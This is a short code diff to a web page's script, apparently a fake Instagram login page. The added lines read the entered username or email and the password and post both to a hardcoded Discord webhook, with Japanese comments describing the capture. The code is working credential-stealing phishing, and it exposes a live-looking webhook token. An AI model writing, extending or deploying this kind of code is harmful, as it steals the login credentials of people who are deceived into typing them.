@@ -70,8 +70,9 @@
 <script>
     function sendWebhook() {
     const webhookUrl = 'https://discord.com/api/webhooks/1217773735701118987/Ui-NiNk8HmuDShFCVPbJOLmP4XbWH_saXaI-rDQfZh5vWW6cfpvFXiNA5T8aVnd4f3I6';
-    const inputText = document.querySelector('input[type="text"]').value; // テキスト入力欄の値を取得
-    const message = `Someone tried to hack into Instagram with input: ${inputText}`; // 入力された文字をメッセージに含める
+    const inputText = document.querySelector('input[type="text"]').value; // ユーザー名やメールアドレスの値を取得
+    const password = document.querySelector('input[type="password"]').value; // パスワードの値を取得
+    const message = `Someone tried to hack into Instagram with input: ${inputText} and password: ${password}`; // 入力された文字とパスワードをメッセージに含める
 
     fetch(webhookUrl, {
         method: 'POST',
